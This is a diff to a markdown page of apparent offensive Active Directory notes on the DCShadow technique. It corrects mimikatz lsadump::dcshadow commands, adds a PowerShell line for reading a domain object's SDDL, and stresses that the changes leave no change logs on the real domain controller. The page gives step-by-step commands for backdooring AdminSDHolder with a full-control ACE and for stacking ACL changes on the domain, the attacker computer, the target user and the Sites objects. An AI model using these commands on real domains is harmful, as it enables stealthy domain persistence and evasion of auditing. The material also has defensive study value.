@@ -12,7 +12,7 @@ DCShadow temporaly registers a new DC in the target domain and uses it to push a
 
 The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services.
 
-Due to the attributes are changed from a domain dontroller, there are no directory change logs on the actual DC for the target object.
+Due to the attributes are changed from a domain dontroller, **there are no change logs on the actual DC for the target object**.
 
 By default, domain administrative privileges are required to use DCShadow.
 
@@ -57,7 +57,7 @@ lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=corp,DC=local /attribute
 Modified ACL:
 
 ORIGINAL ACL + FULL CONTROL FOR OUR USER
-0:DAG:DAD:PAI(A;;LCRPLORC;;;AU)  .....................  (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323)
+....(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323)
 ```
 
 > **Note**: We just need to add our SID to the SY/BA/DA ACE result. To see the SID we can use:
@@ -66,8 +66,11 @@ ORIGINAL ACL + FULL CONTROL FOR OUR USER
 
 ## Shadowception
 
-We can even run DCShadow from DCShadow. To do that task we will add 4 ACL and add the following content:
+We can even run DCShadow from DCShadow. To do that task we will add the following ACLs:
 
+```powershell
+(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=local")).psbase.ObjectSecurity.sddl
+```
 > **Note** We can use `/stack` to stack multiple ACL.
 
 ### Domain Object
@@ -84,7 +87,7 @@ We can even run DCShadow from DCShadow. To do that task we will add 4 ACL and ad
 ```
 * Stack the ACL
 ```
-lsadump::dcshado /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
+lsadump::dcshadow /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
 ### Attacker Computer Object
@@ -99,7 +102,7 @@ lsadump::dcshado /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor
 ```
 * Stack the ACL
 ```
-lsadump::dcshado /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
+lsadump::dcshadow /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
 ### Target User Object
@@ -114,7 +117,7 @@ lsadump::dcshado /stack /object:machine01$ /attribute:ntSecurityDescriptor /valu
 ```
 * Stack the ACL
 ```
-lsadump::dcshado /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
+lsadump::dcshadow /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
 ### Sites Configuration Object
@@ -129,7 +132,7 @@ lsadump::dcshado /stack /object:targetuser01 /attribute:ntSecurityDescriptor /va
 ```
 * Stack the ACL
 ```
-lsadump::dcshado /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
+lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
 ```
 
 Finally we just start the server:
